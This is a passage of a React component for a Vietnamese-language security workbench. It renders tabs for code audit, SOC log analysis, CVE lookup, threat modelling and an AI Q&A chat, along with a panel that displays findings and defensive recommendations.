                    className="w-full rounded-xl border border-[#E5E2DC] dark:border-white/[0.12] bg-[#FAF9F6] dark:bg-[#0B0E14] p-3.5 font-mono-tech text-xs leading-relaxed text-[#0F172A] dark:text-[#F1F5F9] placeholder:text-[#64748B] focus:outline-none focus:border-[#1D4ED8] dark:focus:border-[#3B82F6] resize-y"
                  />
                </div>
              </div>
            )}

            {/* TAB 2: PHÂN TÍCH LOG SOC */}
            {activeTab === "logs" && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <span className="block font-mono-tech text-[10px] uppercase tracking-wider text-[#64748B] dark:text-[#94A3B8]">
                    Tập nhật ký tấn công mẫu (HTTP / WAF / Sysmon):
                  </span>
                  <div className="flex flex-wrap gap-1.5">
                    {LOG_PRESETS.map((preset) => (
                      <button
                        key={preset.id}
                        type="button"
                        onClick={() => {
                          setLogContent(preset.content)
                          setGuardrailAlert(null)
                        }}
                        className="px-2.5 py-1 rounded-md border border-[#E5E2DC] dark:border-white/[0.08] bg-[#FAF9F6] dark:bg-[#161C2A] hover:border-[#1D4ED8] dark:hover:border-[#3B82F6] text-[11px] font-mono-tech text-[#0F172A] dark:text-[#F1F5F9] transition-colors cursor-pointer"
                      >
                        {preset.label}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between">
                    <label
                      htmlFor="workbench-log-content"
                      className="font-mono-tech text-[11px] uppercase tracking-wider text-[#475569] dark:text-[#94A3B8]"
                    >
                      Dòng sự kiện nhật ký (Raw Telemetry)
                    </label>
                    <span className="font-mono-tech text-[11px] text-[#64748B] dark:text-[#94A3B8]">
                      {logContent ? logContent.split(/\r?\n/).filter(Boolean).length : 0} sự kiện
                    </span>
                  </div>
                  <textarea
                    id="workbench-log-content"
                    name="logContent"
                    rows={10}
                    value={logContent}
                    onChange={(e) => setLogContent(e.target.value)}
                    onKeyDown={(e) => {
                      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
                        e.preventDefault()
                        runAnalysis("logs")
                      }
                    }}
                    placeholder="Dán nhật ký Nginx/Apache Access Log, Firewall hoặc Windows Sysmon Event..."
                    className="w-full rounded-xl border border-[#E5E2DC] dark:border-white/[0.12] bg-[#FAF9F6] dark:bg-[#0B0E14] p-3.5 font-mono-tech text-xs leading-relaxed text-[#0F172A] dark:text-[#F1F5F9] placeholder:text-[#64748B] focus:outline-none focus:border-[#1D4ED8] dark:focus:border-[#3B82F6] resize-y"
                  />
                </div>
              </div>
            )}

            {/* TAB 3: TÌNH BÁO CVE */}
            {activeTab === "cve" && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <span className="block font-mono-tech text-[10px] uppercase tracking-wider text-[#64748B] dark:text-[#94A3B8]">
                    Lỗ hổng trọng yếu thường tra cứu:
                  </span>
                  <div className="flex flex-wrap gap-2">
                    {CVE_CHIPS.map((chip) => {
                      const selected = cveId.trim().toUpperCase() === chip.id
                      return (
                        <button
                          key={chip.id}
                          type="button"
                          onClick={() => {
                            setCveId(chip.id)
                            runAnalysis("cve", { cveId: chip.id })
                          }}
                          className={`px-3 py-1.5 rounded-lg border text-left transition-colors cursor-pointer ${
                            selected
                              ? "bg-[#1D4ED8]/10 dark:bg-[#3B82F6]/15 border-[#1D4ED8] dark:border-[#3B82F6] text-[#1D4ED8] dark:text-[#38BDF8]"
                              : "bg-[#FAF9F6] dark:bg-[#161C2A] border-[#E5E2DC] dark:border-white/[0.08] text-[#0F172A] dark:text-[#F1F5F9] hover:border-[#1D4ED8] dark:hover:border-[#3B82F6]"
                          }`}
                        >
                          <div className="font-mono-tech text-xs font-semibold">{chip.id}</div>
                          <div className="font-sans text-[10px] text-[#64748B] dark:text-[#94A3B8]">
                            {chip.tag}
                          </div>
                        </button>
                      )
                    })}
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label
                    htmlFor="workbench-cve-id"
                    className="block font-mono-tech text-[11px] uppercase tracking-wider text-[#475569] dark:text-[#94A3B8]"
                  >
                    Mã định danh CVE (CVE Identifier)
                  </label>
                  <input
                    id="workbench-cve-id"
                    name="cveId"
                    type="text"
                    value={cveId}
                    onChange={(e) => setCveId(e.target.value)}
                    onKeyDown={(e) => {
                      if (e.key === "Enter") {
                        e.preventDefault()
                        runAnalysis("cve")
                      }
                    }}
                    placeholder="VD: CVE-2021-44228"
                    className="w-full rounded-xl border border-[#E5E2DC] dark:border-white/[0.12] bg-[#FAF9F6] dark:bg-[#0B0E14] px-4 py-3 font-mono-tech text-sm text-[#0F172A] dark:text-[#F1F5F9] placeholder:text-[#64748B] focus:outline-none focus:border-[#1D4ED8] dark:focus:border-[#3B82F6]"
                  />
                </div>
              </div>
            )}

            {/* TAB 4: MÔ HÌNH HÓA MỐI ĐE DỌA STRIDE & ATT&CK */}
            {activeTab === "threat" && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <span className="block font-mono-tech text-[10px] uppercase tracking-wider text-[#64748B] dark:text-[#94A3B8]">
                    Kịch bản kiến trúc mẫu:
                  </span>
                  <div className="flex flex-col gap-1.5">
                    {THREAT_PRESETS.map((preset, idx) => (
                      <button
                        key={idx}
                        type="button"
                        onClick={() => {
                          setThreatTopic(preset)
                          setGuardrailAlert(null)
                        }}
                        className="text-left px-3 py-2 rounded-lg border border-[#E5E2DC] dark:border-white/[0.08] bg-[#FAF9F6] dark:bg-[#161C2A] hover:border-[#1D4ED8] dark:hover:border-[#3B82F6] text-xs text-[#0F172A] dark:text-[#F1F5F9] transition-colors cursor-pointer"
                      >
                        {preset}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label
                    htmlFor="workbench-threat-topic"
                    className="block font-mono-tech text-[11px] uppercase tracking-wider text-[#475569] dark:text-[#94A3B8]"
                  >
                    Mô tả Hệ thống / Chủ đề Mô hình hóa
                  </label>
                  <textarea
                    id="workbench-threat-topic"
                    name="threatTopic"
                    rows={5}
                    value={threatTopic}
                    onChange={(e) => setThreatTopic(e.target.value)}
                    onKeyDown={(e) => {
                      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
                        e.preventDefault()
                        runAnalysis("threat")
                      }
                    }}
                    placeholder="Mô tả thành phần hạ tầng, luồng dữ liệu, giao thức xác thực để lập ma trận STRIDE & ATT&CK..."
                    className="w-full rounded-xl border border-[#E5E2DC] dark:border-white/[0.12] bg-[#FAF9F6] dark:bg-[#0B0E14] p-3.5 text-xs sm:text-sm leading-relaxed text-[#0F172A] dark:text-[#F1F5F9] placeholder:text-[#64748B] focus:outline-none focus:border-[#1D4ED8] dark:focus:border-[#3B82F6] resize-y"
                  />
                </div>
              </div>
            )}

            {/* TAB 5: NGHIÊN CỨU SOCRATIC & HỎI ĐÁP */}
            {activeTab === "chat" && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                    <label
                      htmlFor="workbench-chat-provider"
                      className="font-mono-tech text-[11px] uppercase tracking-wider text-[#475569] dark:text-[#94A3B8]"
                    >
                      Chọn Mô hình Suy luận (AI Provider)
                    </label>
                    <select
                      id="workbench-chat-provider"
                      name="chatProvider"
                      value={chatProvider}
                      onChange={(e) => setChatProvider(e.target.value)}
                      className="sm:w-64 rounded-lg border border-[#E5E2DC] dark:border-white/[0.12] bg-[#FAF9F6] dark:bg-[#161C2A] px-3 py-2 text-xs font-medium text-[#0F172A] dark:text-[#F1F5F9] focus:outline-none focus:border-[#1D4ED8] dark:focus:border-[#3B82F6]"
                    >
                      {CHAT_PROVIDERS.map((p) => (
                        <option key={p.id} value={p.id}>
                          {p.label} ({p.badgeLabel})
                        </option>
                      ))}
                    </select>
                  </div>

                  <p className="text-[11px] text-[#64748B] dark:text-[#94A3B8] px-3 py-2 rounded-lg bg-[#FAF9F6] dark:bg-[#161C2A] border border-[#EFEDE7] dark:border-white/[0.06]">
                    {CHAT_PROVIDERS.find((p) => p.id === chatProvider)?.description}
                  </p>
                </div>

                <div className="space-y-2">
                  <span className="block font-mono-tech text-[10px] uppercase tracking-wider text-[#64748B] dark:text-[#94A3B8]">
                    Câu hỏi Socratic gợi mở:
                  </span>
                  <div className="flex flex-col gap-1.5">
                    {CHAT_SUGGESTIONS.map((q, idx) => (
                      <button
                        key={idx}
                        type="button"
                        onClick={() => {
                          setChatMessage(q)
                          runAnalysis("chat", { message: q, provider: chatProvider })
                        }}
                        className="text-left px-3 py-2 rounded-lg border border-[#E5E2DC] dark:border-white/[0.08] bg-[#FAF9F6] dark:bg-[#161C2A] hover:border-[#1D4ED8] dark:hover:border-[#3B82F6] text-xs text-[#0F172A] dark:text-[#F1F5F9] transition-colors cursor-pointer"
                      >
                        {q}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label
                    htmlFor="workbench-chat-message"
                    className="block font-mono-tech text-[11px] uppercase tracking-wider text-[#475569] dark:text-[#94A3B8]"
                  >
                    Câu hỏi Nghiên cứu
                  </label>
                  <textarea
                    id="workbench-chat-message"
                    name="chatMessage"
                    rows={4}
                    value={chatMessage}
                    onChange={(e) => setChatMessage(e.target.value)}
                    onKeyDown={(e) => {
                      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
                        e.preventDefault()
                        runAnalysis("chat")
                      }
                    }}
                    placeholder="Đặt câu hỏi về nguyên lý giao thức, cơ chế tấn công hoặc cách phòng vệ sâu..."
                    className="w-full rounded-xl border border-[#E5E2DC] dark:border-white/[0.12] bg-[#FAF9F6] dark:bg-[#0B0E14] p-3.5 text-xs sm:text-sm leading-relaxed text-[#0F172A] dark:text-[#F1F5F9] placeholder:text-[#64748B] focus:outline-none focus:border-[#1D4ED8] dark:focus:border-[#3B82F6] resize-y"
                  />
                </div>

                {chatHistory.length > 0 && (
                  <div className="pt-2 border-t border-[#EFEDE7] dark:border-white/[0.06] space-y-2">
                    <span className="font-mono-tech text-[10px] uppercase tracking-wider text-[#64748B] dark:text-[#94A3B8]">
                      Nhật ký đối thoại phiên hiện tại ({chatHistory.length})
                    </span>
                    <div className="space-y-1.5 max-h-40 overflow-y-auto pr-1">
                      {chatHistory.map((item) => (
                        <button
                          key={item.id}
                          type="button"
                          onClick={() => {
                            setResultsByTab((prev) => ({ ...prev, chat: item.response }))
                            setExecutionModeByTab((prev) => ({ ...prev, chat: item.mode }))
                          }}
                          className="w-full text-left px-3 py-2 rounded-lg bg-[#FAF9F6] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08] hover:border-[#1D4ED8] dark:hover:border-[#3B82F6] text-xs transition-colors cursor-pointer"
                        >
                          <div className="flex items-center justify-between gap-2">
                            <span className="font-medium text-[#0F172A] dark:text-[#F1F5F9] truncate">
                              {item.question}
                            </span>
                            <span className="font-mono-tech text-[10px] uppercase text-[#1D4ED8] dark:text-[#38BDF8] shrink-0">
                              {item.provider}
                            </span>
                          </div>
                        </button>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* THANH THỰC THI HÀNH ĐỘNG */}
            <div className="pt-2 flex flex-wrap items-center justify-between gap-3 border-t border-[#EFEDE7] dark:border-white/[0.06]">
              <span className="font-mono-tech text-[11px] text-[#64748B] dark:text-[#94A3B8]">
                Mẹo: Nhấn <kbd className="px-1.5 py-0.5 rounded bg-[#F3F1EC] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08]">Ctrl + Enter</kbd> để chạy nhanh
              </span>

              <div className="flex items-center gap-2">
                {currentResult && (
                  <button
                    type="button"
                    onClick={() => {
                      setResultsByTab((prev) => ({ ...prev, [activeTab]: null }))
                      setGuardrailAlert(null)
                    }}
                    className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg border border-[#E5E2DC] dark:border-white/[0.08] text-xs font-medium text-[#475569] dark:text-[#94A3B8] hover:bg-[#F3F1EC] dark:hover:bg-[#161C2A] cursor-pointer transition-colors"
                  >
                    <RotateCcw className="h-3.5 w-3.5" />
                    <span>Xóa kết quả</span>
                  </button>
                )}

                <button
                  type="button"
                  disabled={isAnalyzing}
                  onClick={() => runAnalysis(activeTab)}
                  className="inline-flex items-center justify-center gap-2 px-5 py-2.5 rounded-lg bg-[#1D4ED8] hover:bg-[#1E40AF] dark:bg-[#3B82F6] dark:hover:bg-[#2563EB] disabled:opacity-60 text-white text-xs sm:text-sm font-semibold cursor-pointer transition-colors"
                >
                  {isAnalyzing ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin" />
                      <span>Đang phân tích...</span>
                    </>
                  ) : (
                    <>
                      <Send className="h-3.5 w-3.5" />
                      <span>
                        {activeTab === "audit" && "Chạy Kiểm toán Mã nguồn"}
                        {activeTab === "logs" && "Phân tích Nhật ký SOC"}
                        {activeTab === "cve" && "Tra cứu Tình báo CVE"}
                        {activeTab === "threat" && "Xây dựng Mô hình STRIDE"}
                        {activeTab === "chat" && "Gửi Câu hỏi Socratic"}
                      </span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </section>

          {/* CỘT PHẢI: TRÌNH HIỂN THỊ KẾT QUẢ CHUẨN AiResponse */}
          <section className="lg:col-span-6 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] p-5 sm:p-6 min-h-[520px] flex flex-col">
            {isAnalyzing ? (
              <div className="space-y-4" aria-busy="true">
                <div className="flex items-center justify-between gap-2 pb-4 border-b border-[#EFEDE7] dark:border-white/[0.06]">
                  <span className="inline-flex items-center gap-2 font-mono-tech text-xs text-[#1D4ED8] dark:text-[#38BDF8]">
                    <Loader2 className="h-3.5 w-3.5 animate-spin" />
                    <span>Đang tổng hợp phân tích từ AI Router...</span>
                  </span>
                  <div className="h-5 w-24 rounded bg-[#F3F1EC] dark:bg-[#161C2A]" />
                </div>
                <div className="h-7 w-3/4 rounded bg-[#F3F1EC] dark:bg-[#161C2A]" />
                <div className="space-y-2 pt-2">
                  <div className="h-4 w-full rounded bg-[#F3F1EC] dark:bg-[#161C2A]" />
                  <div className="h-4 w-5/6 rounded bg-[#F3F1EC] dark:bg-[#161C2A]" />
                  <div className="h-4 w-2/3 rounded bg-[#F3F1EC] dark:bg-[#161C2A]" />
                </div>
                <div className="h-32 w-full rounded-lg bg-[#F3F1EC] dark:bg-[#161C2A]" />
                <div className="h-24 w-full rounded-lg bg-[#F3F1EC] dark:bg-[#161C2A]" />
              </div>
            ) : currentResult ? (
              <div className="space-y-5 flex-1">
                {/* Thanh Telemetry AiResponse */}
                <div className="flex flex-wrap items-center justify-between gap-2 pb-4 border-b border-[#EFEDE7] dark:border-white/[0.06]">
                  <div className="flex flex-wrap items-center gap-2">
                    <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-[#1D4ED8]/10 dark:bg-[#3B82F6]/15 border border-[#1D4ED8]/20 dark:border-[#3B82F6]/30 font-mono-tech text-[11px] font-semibold text-[#1D4ED8] dark:text-[#38BDF8]">
                      {currentResult.provider || "AI_ROUTER"}
                    </span>
                    <span className="inline-flex items-center px-2.5 py-1 rounded-md bg-[#F3F1EC] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08] font-mono-tech text-[11px] text-[#475569] dark:text-[#94A3B8]">
                      {currentResult.modelName || "Standard Model"}
                    </span>
                    <span className="inline-flex items-center gap-1 px-2 py-1 rounded-md bg-[#FAF9F6] dark:bg-[#0B0E14] border border-[#E5E2DC] dark:border-white/[0.08] font-mono-tech text-[11px] text-[#64748B] dark:text-[#94A3B8]">
                      <Clock className="h-3 w-3" />
                      {currentResult.processingTimeMs ?? 0} ms
                    </span>
                  </div>

                  <div className="flex items-center gap-2">
                    <span
                      className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full border text-[11px] font-mono-tech font-medium ${
                        currentExecutionMode === "live"
                          ? "bg-emerald-50 dark:bg-emerald-500/12 border-emerald-200 dark:border-emerald-500/25 text-emerald-700 dark:text-emerald-300"
                          : "bg-amber-50 dark:bg-amber-500/12 border-amber-200 dark:border-amber-500/25 text-amber-800 dark:text-amber-300"
                      }`}
                    >
                      {currentExecutionMode === "live" ? "Backend Live AI" : "Mẫu Học Thuật"}
                    </span>

                    <button
                      type="button"
                      onClick={handleCopyReport}
                      className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md border border-[#E5E2DC] dark:border-white/[0.08] bg-[#FAF9F6] dark:bg-[#161C2A] hover:border-[#1D4ED8] dark:hover:border-[#3B82F6] text-[11px] font-medium text-[#0F172A] dark:text-[#F1F5F9] cursor-pointer transition-colors"
                    >
                      {copiedReport ? (
                        <>
                          <Check className="h-3.5 w-3.5 text-emerald-600 dark:text-emerald-400" />
                          <span>Đã sao chép</span>
                        </>
                      ) : (
                        <>
                          <Copy className="h-3.5 w-3.5" />
                          <span>Sao chép</span>
                        </>
                      )}
                    </button>
                  </div>
                </div>

                {/* Tiêu đề báo cáo */}
                <div>
                  <h3 className="font-serif-editorial text-xl sm:text-2xl font-medium text-[#0F172A] dark:text-[#F1F5F9] leading-snug">
                    {currentResult.title}
                  </h3>
                </div>

                {/* Danh sách phát hiện trọng tâm (keyFindings[]) */}
                {Array.isArray(currentResult.keyFindings) && currentResult.keyFindings.length > 0 && (
                  <div className="rounded-xl bg-[#FAF9F6] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08] p-4 space-y-2.5">
                    <div className="flex items-center gap-2 font-mono-tech text-[11px] uppercase tracking-wider text-[#1D4ED8] dark:text-[#38BDF8]">
                      <Info className="h-3.5 w-3.5" />
                      <span>Phát hiện Trọng tâm ({currentResult.keyFindings.length})</span>
                    </div>
                    <ul className="space-y-2">
                      {currentResult.keyFindings.map((finding, idx) => (
                        <li
                          key={idx}
                          className="flex items-start gap-2.5 text-xs sm:text-sm text-[#0F172A] dark:text-[#F1F5F9] leading-relaxed"
                        >
                          <span className="font-mono-tech text-[11px] font-semibold text-[#1D4ED8] dark:text-[#38BDF8] mt-0.5 shrink-0">
                            0{idx + 1}
                          </span>
                          <span>{finding}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                {/* Nội dung phân tích chi tiết (analysisResult) */}
                {currentResult.analysisResult && (
                  <div className="pt-1">
                    <StructuredMarkdownBody content={currentResult.analysisResult} />
                  </div>
                )}

                {/* Khuyến nghị phòng thủ (recommendations[]) */}
                {Array.isArray(currentResult.recommendations) && currentResult.recommendations.length > 0 && (
                  <div className="rounded-xl bg-emerald-50/60 dark:bg-emerald-500/8 border border-emerald-200/80 dark:border-emerald-500/25 p-4 space-y-2.5">
                    <div className="flex items-center gap-2 font-mono-tech text-[11px] uppercase tracking-wider text-emerald-700 dark:text-emerald-300">
                      <ShieldCheck className="h-3.5 w-3.5" />
                      <span>Khuyến nghị Khắc phục &amp; Kiểm soát ({currentResult.recommendations.length})</span>
                    </div>
                    <ul className="space-y-2">
                      {currentResult.recommendations.map((rec, idx) => (
                        <li
                          key={idx}
                          className="flex items-start gap-2 text-xs sm:text-sm text-[#0F172A] dark:text-[#F1F5F9] leading-relaxed"
                        >
                          <CheckCircle2 className="h-4 w-4 text-emerald-600 dark:text-emerald-400 shrink-0 mt-0.5" />
                          <span>{rec}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                )}
              </div>
            ) : (
              /* TRẠNG THÁI CHỜ (EMPTY STATE CÓ HÀNH ĐỘNG RÕ RÀNG) */
              <div className="flex-1 flex flex-col justify-between">
                <div className="space-y-4">
                  <div className="flex items-center justify-between pb-4 border-b border-[#EFEDE7] dark:border-white/[0.06]">
                    <span className="font-mono-tech text-[11px] uppercase tracking-[0.12em] text-[#64748B] dark:text-[#94A3B8]">
                      TRÌNH HIỂN THỊ KẾT QUẢ AI // CHỜ LỆNH
                    </span>
                    <span className="font-mono-tech text-[11px] text-[#64748B] dark:text-[#94A3B8]">
                      Cấu trúc: AiResponse v1
                    </span>
                  </div>

                  <div className="py-10 px-4 text-center space-y-4 max-w-md mx-auto">
                    <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-xl bg-[#F3F1EC] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08] text-[#1D4ED8] dark:text-[#38BDF8]">
                      <Cpu className="h-6 w-6" strokeWidth={1.6} />
                    </div>
                    <h3 className="font-serif-editorial text-xl font-medium text-[#0F172A] dark:text-[#F1F5F9]">
                      Sẵn sàng tiếp nhận dữ liệu phân tích
                    </h3>
                    <p className="text-xs sm:text-sm text-[#475569] dark:text-[#94A3B8] leading-relaxed">
                      Kết quả sẽ được cấu trúc thành 4 thành phần chuẩn hóa: Thông số mô hình, Phát hiện trọng tâm (<code className="font-mono-tech text-[11px]">keyFindings</code>), Giải phẫu kỹ thuật và Khuyến nghị vá lỗi (<code className="font-mono-tech text-[11px]">recommendations</code>).
                    </p>
                    <button
                      type="button"
                      onClick={() => {
                        if (activeTab === "chat" && !chatMessage.trim()) {
                          const defaultQuestion = CHAT_SUGGESTIONS[0]
                          setChatMessage(defaultQuestion)
                          runAnalysis("chat", { message: defaultQuestion, provider: chatProvider })
                        } else {
                          runAnalysis(activeTab)
                        }
                      }}
                      className="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-[#F3F1EC] dark:bg-[#161C2A] hover:bg-[#ECE9E2] dark:hover:bg-[#1B2335] border border-[#E5E2DC] dark:border-white/[0.08] text-xs font-semibold text-[#0F172A] dark:text-[#F1F5F9] cursor-pointer transition-colors"
                    >
                      <span>Chạy thử ngay với dữ liệu mẫu hiện tại</span>
                      <ArrowRight className="h-3.5 w-3.5 text-[#1D4ED8] dark:text-[#38BDF8]" />
                    </button>
                  </div>
                </div>

                <div className="pt-4 border-t border-[#EFEDE7] dark:border-white/[0.06] grid grid-cols-3 gap-3 text-center">
                  <div className="p-2.5 rounded-lg bg-[#FAF9F6] dark:bg-[#161C2A] border border-[#EFEDE7] dark:border-white/[0.06]">
                    <div className="font-mono-tech text-[10px] text-[#64748B] dark:text-[#94A3B8]">BỘ LỌC AN TOÀN</div>
                    <div className="font-sans text-xs font-semibold text-[#0F172A] dark:text-[#F1F5F9] mt-0.5">
                      Chống Prompt Injection
                    </div>
                  </div>
                  <div className="p-2.5 rounded-lg bg-[#FAF9F6] dark:bg-[#161C2A] border border-[#EFEDE7] dark:border-white/[0.06]">
                    <div className="font-mono-tech text-[10px] text-[#64748B] dark:text-[#94A3B8]">TIÊU CHUẨN</div>
                    <div className="font-sans text-xs font-semibold text-[#0F172A] dark:text-[#F1F5F9] mt-0.5">
                      CWE · ATT&amp;CK
                    </div>
                  </div>
                  <div className="p-2.5 rounded-lg bg-[#FAF9F6] dark:bg-[#161C2A] border border-[#EFEDE7] dark:border-white/[0.06]">
                    <div className="font-mono-tech text-[10px] text-[#64748B] dark:text-[#94A3B8]">NHẬT KÝ KIỂM TOÁN</div>
                    <div className="font-sans text-xs font-semibold text-[#0F172A] dark:text-[#F1F5F9] mt-0.5">
                      Theo dõi Quota
                    </div>
                  </div>
                </div>
              </div>
            )}
          </section>
        </div>
      </div>
    </div>
  )
}

export default SecurityWorkbench
